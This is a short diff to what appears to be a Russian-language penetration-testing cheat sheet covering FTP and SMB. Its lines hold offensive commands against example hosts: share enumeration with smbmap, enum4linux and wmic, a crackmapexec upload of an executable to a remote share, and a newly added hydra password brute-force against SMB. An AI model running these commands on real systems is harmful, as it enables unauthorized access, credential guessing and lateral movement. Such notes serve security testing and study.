@@ -281,7 +281,7 @@ ls|prompt no|mget * .|
 wget -m ftp://anonymous:anonymous@hostname
 ```
 
-## SMB
+# SMB
 Шары
 
 ```
@@ -289,6 +289,11 @@ smbmap -u shut -p nik123 -H alloc.trust.localhost -d trust.localhost (-q -R --de
 crackmapexec smb inv1.trust.localhost -u shut -p nik123 -d trust.localhost --put-file k1.exe  \\k1.exe
 wmic /node:alloc.trust.localhost /user:'trust.localhost\shut' /password:nik123 share list \\172.16.1.1
 enum4linux -a -u shut -p nik123 -w trust.localhost alloc.trust.localhost
+```
+## Подбор пароля:
+
+```
+hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt <victim_ip> smb -V
 ```
 
 ## Монтирование шары:
